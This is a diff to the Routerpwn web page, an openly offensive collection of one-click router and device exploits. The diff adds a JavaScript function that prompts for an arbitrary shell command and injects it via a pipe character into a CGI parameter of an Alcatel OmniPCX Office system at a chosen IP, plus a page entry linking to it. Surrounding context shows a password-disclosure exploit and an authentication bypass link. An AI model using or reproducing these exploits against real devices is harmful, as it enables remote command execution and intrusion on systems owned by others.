@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.214</title>
+		<title>Routerpwn 1.13.215</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -217,6 +217,14 @@ function rtn16_passdisclosure(ip)
 {
     ip = ip || "192.168.1.1";
     document.location="http://"+ip+"/error_page.htm";
+}
+
+// Alcatel OmniPCX Office 210/061.1 - Remote Command Execution
+function omnipcx_commandexec(ip)
+{
+	cmd = prompt("Command:");
+	url = "/cgi-data/FastJSData.cgi?id1=sh2kerr&id2=91|" + encodeURI(cmd);
+	document.location="http://"+ip+url;
 }
 
 // D-Link DWL-2100AP - Configuration Disclosure
@@ -2232,7 +2240,7 @@ a=a+1
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="alcatellucent">
 <h2>Alcatel-Lucent</h2>
-<h3><a href="javascript:img('I-240W-Q')">I-240W-Q</a></h3>
+<h3><a href="javascript:img('I-240W-Q')">I-240W-Q</a>, <a href="javascript:img('OmniPCX Office')">OmniPCX Office</a></h3>
 
 <article>
 	<div>19/12/13</div>
@@ -2246,6 +2254,13 @@ a=a+1
 	<div><a href="http://www.hakim.ws/2012/12/puerta-trasera-en-fibra-optica-alcatel-lucent-de-infinitum/">[+]</a></div>
 	<div><a href="javascript:i230w_auth()">I-240W-Q Authentication Bypass</a></div>
 	<div><a href="javascript:i230w_auth(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>31/01/08</div>
+	<div><a href="http://www.exploit-db.com/exploits/5662/">[+]</a></div>
+	<div><a href="javascript:omnipcx_commandexec(ip)">Alcatel OmniPCX Office 210/061.1 - Remote Command Execution</a></div>
+	<div><a href="javascript:omnipcx_commandexec(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 <div style="float: right"><a href="#">^ Top</a></div>
